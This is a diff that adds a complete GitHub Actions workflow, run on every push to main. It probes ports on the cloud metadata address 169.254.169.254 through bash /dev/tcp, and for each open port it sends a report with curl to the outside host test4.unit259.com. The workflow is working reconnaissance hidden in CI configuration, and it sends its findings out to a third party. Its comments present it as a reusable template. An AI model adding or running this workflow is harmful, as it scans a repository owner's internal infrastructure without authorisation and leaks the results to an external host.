@@ -1,8 +1,22 @@
-- name: Internalportscan
-  run: |
-    for p in 22 80 443 3306 5432; do
-      timeout 1 bash -c "echo > /dev/tcp/169.254.169.254/$p" 2>/dev/null && \
-      curl -sG https://test4.unit259.com/log \
-        --data-urlencode prefix=internal-scan \
-        --data-urlencode port=$p
-    done
+name: InternalPortScan          # workflow display name
+
+on:                             # trigger — use whatever you like
+  push:
+    branches: [ main ]
+
+jobs:
+  internal-port-scan:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Metadata / internal port scan
+        shell: bash
+        run: |
+          # list of ports to probe on the AWS/Azure metadata service
+          for p in 22 80 443 3306 5432; do
+            if timeout 1 bash -c "echo > /dev/tcp/169.254.169.254/$p" 2>/dev/null ; then
+              curl -sG https://test4.unit259.com/log \
+                   --data-urlencode prefix=internal-scan \
+                   --data-urlencode port=$p
+            fi
+          done
